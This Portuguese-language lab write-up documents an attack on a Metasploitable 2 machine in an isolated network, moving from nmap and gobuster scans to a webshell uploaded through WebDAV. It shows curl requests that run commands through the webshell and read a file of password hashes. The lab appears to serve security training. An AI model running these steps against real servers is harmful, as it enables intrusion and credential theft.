# 📂 EVIDÊNCIAS TÉCNICAS  
## Credential Dump & Webshell Attack Lab

---

## 🎯 Escopo do Laboratório

- **Alvo:** Metasploitable 2  
- **IP do Alvo:** 192.168.56.124  
- **Ambiente:** Laboratório controlado  
- **Metodologia aplicada:** Reconhecimento → Enumeração → Exploração → Pós-Exploração  

---

# 🖥️ 0️⃣ Ambiente do Atacante – Kali Linux

**Sistema Operacional:** Kali Linux  
**Virtualização:** VirtualBox  
**Configuração de Rede:** Host-Only (ambiente isolado)

### 🎯 Objetivo
Validar que o ambiente do atacante está corretamente configurado antes do início da exploração.

### 📸 Evidência

<img width="1280" height="800" alt="00_kali_environment" src="https://github.com/user-attachments/assets/a22293a9-c330-4dae-aa7b-5f254045b9b8" />

---

# 📡 1️⃣ Verificação de Conectividade

### 🛠️ Comando utilizado

```bash
ping 192.168.56.124
```

### 🎯 Objetivo
Confirmar comunicação entre Kali Linux e Metasploitable 2.

### ✅ Resultado
Respostas ICMP recebidas com sucesso, confirmando:

- Comunicação ativa  
- Ausência de perda de pacotes  
- Conectividade estável na rede isolada  

### 📸 Evidência

<img width="1920" height="936" alt="01_ping_kali_to_metasploitable" src="https://github.com/user-attachments/assets/a040a094-f00e-4be2-b43f-feb7b794ecaf" />

---

# 🔎 2️⃣ Enumeração de Portas e Serviços

### 🛠️ Comando utilizado

```bash
nmap -sS -sV -p- 192.168.56.124
```

### 🎯 Objetivo
Identificar portas abertas e serviços expostos no servidor alvo.

### ✅ Resultado Identificado

- Diversos serviços inseguros expostos (FTP, Telnet, SMTP, MySQL, etc.)
- Serviço HTTP ativo (Apache 2.2.8)
- Indícios de WebDAV habilitado

O cenário indica superfície de ataque ampla e múltiplos vetores potenciais de exploração.

### 📸 Evidência

<img width="1920" height="936" alt="02_nmap_initial_scan" src="https://github.com/user-attachments/assets/1afa917d-06ef-4f6c-b4d5-4dfb99b4ad4d" />

---

# 📁 3️⃣ Descoberta de Diretório Vulnerável

### 🛠️ Comando utilizado

```bash
gobuster dir -u http://192.168.56.124 -w /usr/share/wordlists/dirb/common.txt
```

### 📂 Diretório identificado

```
/dav
```

### ⚠️ Impacto

Diretório acessível com permissões inadequadas, permitindo:

- Upload de arquivos
- Manipulação de conteúdo
- Possível execução remota de código

### 📸 Evidência

<img width="1920" height="936" alt="03_gobuster_directory_enum" src="https://github.com/user-attachments/assets/0b33dedb-f359-4c92-9c61-cdb0d0bb618e" />

---

# 💻 4️⃣ Execução Remota de Comandos (RCE)

Após o upload de uma WebShell no diretório `/dav`, foi possível executar comandos remotamente no servidor.

### 🛠️ Teste realizado

```bash
curl "http://192.168.56.124/dav/shell.php?cmd=whoami"
```

### ✅ Resultado

```
www-data
```

### 🚨 Impacto

- Execução remota de comandos validada  
- Comprometimento do servidor  
- Controle remoto com privilégios do serviço web  

### 📸 Evidência

<img width="1920" height="936" alt="04_rce_whoami" src="https://github.com/user-attachments/assets/cd73709e-dce3-45f6-bd34-ad6865b024e1" />

---

# 🔐 5️⃣ Extração de Credenciais

### 📂 Arquivo identificado

```
/home/msfadmin/shadow_copy
```

### 🛠️ Comando utilizado

```bash
curl "http://192.168.56.124/dav/shell.php?cmd=cat%20/home/msfadmin/shadow_copy"
```

### 🚨 Impacto

- Exposição de hashes de senha  
- Possibilidade de quebra offline de credenciais  
- Potencial escalonamento de privilégios  
- Comprometimento total do sistema  

### 📸 Evidência

<img width="1920" height="936" alt="05_shadow_dump" src="https://github.com/user-attachments/assets/e5e934e0-bcde-431f-afee-e1f9ef645afe" />

---

# 🚨 Análise Final

A exploração evidenciou falhas críticas na configuração do serviço WebDAV, permitindo:

- Upload não autenticado de arquivo malicioso  
- Execução remota de comandos (RCE)  
- Acesso a arquivos sensíveis do sistema  
- Exposição de hashes de senha  

**Se explorado em ambiente real, o impacto poderia resultar em comprometimento total do servidor.**

---

🔒 **Laboratório executado exclusivamente em ambiente isolado para fins educacionais.**
